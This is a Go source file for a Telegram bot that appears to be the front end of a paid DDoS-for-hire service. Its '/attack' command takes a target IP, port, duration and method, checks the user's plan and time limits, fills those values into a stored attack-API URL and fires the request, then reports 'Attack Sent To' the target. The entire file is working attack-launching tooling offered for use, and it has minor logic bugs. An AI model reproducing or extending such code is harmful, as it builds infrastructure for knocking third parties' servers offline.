package clientCMD

import (
	"bytes"
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"io/ioutil"
	"strings"
	"TeleBot/master/commands/client/attacks"

	"github.com/go-telegram-bot-api/telegram-bot-api"
	_ "github.com/mattn/go-sqlite3"
)

// Function to check if a user has a valid plan
func ClientAttack(bot *tgbotapi.BotAPI, message *tgbotapi.Message, db *sql.DB) {
	// Validate that the user has a plan to use client commands
	username := message.From.UserName
	if !hasPlan(username, db) {
		msg := tgbotapi.NewMessage(message.Chat.ID, "User does not have a valid plan to use client commands.")
		bot.Send(msg)
		return
	}

	args := message.CommandArguments()
	// Split the arguments
	arguments := strings.Fields(args)

	// Check if there are exactly 4 arguments
	if len(arguments) != 4 {
		msg := tgbotapi.NewMessage(message.Chat.ID, "Please provide exactly 3 arguments: /attack [IP] [PORT] [TIME] [METHOD]")
		bot.Send(msg)
		return
	}

	// Log the host, port, time, and method
	host := arguments[0]
	port := arguments[1]
	time := arguments[2]
	method := arguments[3]
	
	// Validate the provided method
	filePath := "master/methods.json"

	if !attacks.IsValidMethod(method, filePath) {
		msg := tgbotapi.NewMessage(message.Chat.ID, "Invalid method. Please choose a valid method.")
		bot.Send(msg)
		return
	} else if !attacks.IsAttackTimeValid(username, time, db) {
		log.Printf("[VALIDATE] Attack time validation failed for user %s, duration %s", username, time)
		msg := tgbotapi.NewMessage(message.Chat.ID, "Attack time exceeds allowed duration")
		bot.Send(msg)
		return
	}

	log.Printf("[ATTACK] Host: %s, Port: %s, Time: %s, Method: %s", host, port, time, method)

	// Execute the PHP-like code
    SQLSelectAPI, err := db.Query("SELECT `apiLink` FROM `api` LIMIT 1")
    if err != nil {
        log.Printf("Error executing SQL query: %s", err)
        msg := tgbotapi.NewMessage(message.Chat.ID, "Error executing SQL query.")
        bot.Send(msg)
        return
    }
    defer SQLSelectAPI.Close()

	if !SQLSelectAPI.Next() {
		log.Printf("No active servers/apis found")
		msg := tgbotapi.NewMessage(message.Chat.ID, "No active servers or APIs found.")
		bot.Send(msg)
		return
	}

	for SQLSelectAPI.Next() {
		var APILink string
		err := SQLSelectAPI.Scan(&APILink)
		if err != nil {
			log.Printf("Error scanning API link: %s", err)
			msg := tgbotapi.NewMessage(message.Chat.ID, "Error scanning API link.")
			bot.Send(msg)
			return
		}
	
		// Replace placeholders in the API link
		arrayFind := []string{"[host]", "[port]", "[time]", "[method]"}
		arrayReplace := []string{host, port, time, method}
		for i, find := range arrayFind {
			APILink = strings.ReplaceAll(APILink, find, arrayReplace[i])
		}
	
		resp, err := http.Get(APILink)
		if err != nil {
			log.Printf("Error making HTTP request: %s", err)
			msg := tgbotapi.NewMessage(message.Chat.ID, "Error making HTTP request.")
			bot.Send(msg)
			return
		}
	
		// Read the response body
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Printf("Error reading response body: %s", err)
			msg := tgbotapi.NewMessage(message.Chat.ID, "Error reading response body.")
			bot.Send(msg)
			return
		}
	
		// Close the response body immediately after reading
		resp.Body.Close()
	
		// Check for 404 error in the response
		if responseIndicatesError(body) {
			log.Printf("404 Error: Attack not sent to %s:%s", host, port)
			msg := tgbotapi.NewMessage(message.Chat.ID, "404 Error: Attack not sent.")
			bot.Send(msg)
			return
		}
	
		// Send the success message only if there is no 404 status
		msgText := fmt.Sprintf("Attack Sent To: %s:%s \nFor: %s Seconds \nUsing: %s", host, port, time, method)
		msg := tgbotapi.NewMessage(message.Chat.ID, msgText)
		bot.Send(msg)
		log.Printf("%s", APILink)
	}
}

// Function to check if the response indicates an error
func responseIndicatesError(responseBody []byte) bool {
	errorIndications := []string{"404 Not Found", "403 Forbidden", "500 Internal Server Error"} // Add more as needed
	for _, indication := range errorIndications {
		if bytes.Contains(responseBody, []byte(indication)) {
			return true
		}
	}
	return false
}
